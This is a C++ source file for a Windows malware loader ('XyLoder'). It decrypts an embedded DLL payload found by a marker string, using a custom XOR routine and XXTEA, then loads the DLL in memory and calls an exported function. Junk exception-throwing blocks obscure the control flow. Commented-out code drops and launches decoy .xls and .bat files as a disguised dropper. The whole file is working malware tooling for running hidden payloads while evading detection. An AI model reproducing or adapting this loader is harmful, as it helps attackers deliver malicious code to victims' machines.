// XyLoder.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
// 
// #include "C_jjj.h"
// #include "C_xxx.h"
// 

struct Server_DllData
{
	char szFindFlags[20];
	DWORD dwDllDataSize;
	UINT Key;
	BYTE pDllData[1080 * 280];			// �����ݴ�С�������DLL�ļ���С
	
} server_dlldata = 
{
	"www.xy999.com",
		0,
		0,
	{0}
	
};

#include "MemoryModule.h"
//#include "resource.h"
typedef int (WINAPI *PFN_POPMSGBOX)(void);


void EncryptData(unsigned char *szRec, unsigned long nLen, unsigned long key)//����
{
	
	try
	{
		if(1+1==2)throw 48;
	}
	catch (...)
	{
		unsigned long i;
		unsigned char p;
		
		p = (unsigned char ) key % 95 +88;
		for(i = 0; i < nLen; i++) 
		{
			
			try
			{
				if(1+1==2)throw 82;
			}
			catch (...)
			{
				*szRec ^= p;
				*szRec += p;
				szRec++;
			}
			
		}
	}
	
}

char lzxXn[] = {'S','t','u','d','y','H','a','r','d','\0'}; 
//#include <stdint.h>  
#define DELTA 0x9e3779b9  
#define MX (((z>>5^y<<2) + (y>>3^z<<4)) ^ ((sum^y) + (key[(p&3)^e] ^ z)))  

void btea(unsigned char *v, int n, unsigned int const key[4])  
{  
    unsigned int y, z, sum;  
    unsigned p, rounds, e;  
    if (n > 1)            /* Coding Part */  
    {  
        rounds = 6 + 52/n;  
        sum = 0;  
        z = v[n-1];  
        do  
        {  
            sum += DELTA;  
            e = (sum >> 2) & 3;  
            for (p=0; p<n-1; p++)  
            {  
                y = v[p+1];  
                z = v[p] += MX;  
            }  
            y = v[0];  
            z = v[n-1] += MX;  
        }  
        while (--rounds);  
    }  
    else if (n < -1)      /* Decoding Part */  
    {  
        n = -n;  
        rounds = 6 + 52/n;  
        sum = rounds*DELTA;  
        y = v[0];  
        do  
        {  
            e = (sum >> 2) & 3;  
            for (p=n-1; p>0; p--)  
            {  
                z = v[p-1];  
                y = v[p] -= MX;  
            }  
            z = v[n-1];  
            y = v[0] -= MX;  
            sum -= DELTA;  
        }  
        while (--rounds);  
    }  
}  



void LoadDllFromMemAndCall( const char *name)
{
	HMEMORYMODULE hDll;
	PFN_POPMSGBOX pfn;	
	unsigned int const k[4]= {8,1,8,0};  
	EncryptData((unsigned char *)server_dlldata.pDllData,server_dlldata.dwDllDataSize,server_dlldata.Key);
	btea((unsigned char *)server_dlldata.pDllData,-server_dlldata.dwDllDataSize,k);  
	hDll=MemoryLoadLibrary(server_dlldata.pDllData);
	if (hDll==NULL)
		return ;
	pfn=MemoryGetProcAddress(hDll,name);
	if (pfn==NULL)
	{
		MemoryFreeLibrary(hDll);
		
		return;
	}
	pfn();
	if (hDll!=NULL)
	{
		
		MemoryFreeLibrary(hDll);
		hDll=NULL;
	}
}



int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.
// 	////////////////////////////////////����
// 
// 
// 	Sleep(0);
// 	DeleteFile("C:\\2.xls");
// 	Sleep(1000);
// 	DeleteFile("C:\\1.bat");
// 	Sleep(5000);
// 	if (jjjSaveFile("C:\\2.xls")) WinExec("C:\\2.xls",NULL);//�ͷ���C�̸�Ŀ¼�µ��ļ� --ͼƬ�� exe���ĵ����ļ����� 
// 	Sleep(1000);
// 	if (xxxSaveFile("C:\\1.bat")) WinExec("C:\\1.bat",NULL);//ʹ������������ʵ�� ���д��ͷų������ļ�
// 
// 
/////////////////////////////////////////////////



	LoadDllFromMemAndCall(lzxXn);	
	return 0;
}



